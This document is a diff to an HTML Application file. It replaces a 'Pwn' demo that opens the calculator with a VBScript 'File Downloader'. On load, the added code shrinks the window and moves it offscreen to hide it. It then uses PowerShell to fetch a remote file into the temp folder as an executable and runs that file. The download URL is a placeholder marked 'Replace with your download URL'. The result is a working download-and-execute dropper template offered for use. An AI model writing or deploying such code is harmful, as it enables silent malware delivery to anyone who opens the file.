@@ -1,18 +1,32 @@
 <html>
   <head>
-    <title>Hello World</title>
+    <title>File Downloader</title>
   </head>
   <body>
-    <h2>Hello World</h2>
-    <p>This is an HTA...</p>
+    <h2>File Downloader</h2>
+    <p>This HTA downloads and executes a file.</p>
   </body>
 
   <script language="VBScript">
-    Function Pwn()
-      Set shell = CreateObject("wscript.Shell")
-      shell.run "calc"
+    Sub DownloadAndExecute()
+      Window.ResizeTo 1, 1
+      Window.MoveTo -32000, -32000
+      Set objShell = CreateObject("WScript.Shell")
+      tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
+      downloadUrl = "https://shared.steamstatic.com/store_item_assets/steam/apps/1721470/header.jpg" ' Replace with your download URL
+      downloadedFile = tempFolder & "\downloaded-file.exe"
+      cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
+      objShell.Run "cmd.exe /c " & cmdCommand, 0, True
+      If FileExists(downloadedFile) Then
+        objShell.Run Chr(34) & downloadedFile & Chr(34), 1, False
+      End If
+    End Sub
+
+    Function FileExists(filePath)
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      FileExists = fso.FileExists(filePath)
     End Function
 
-    Pwn
+    DownloadAndExecute
   </script>
 </html>
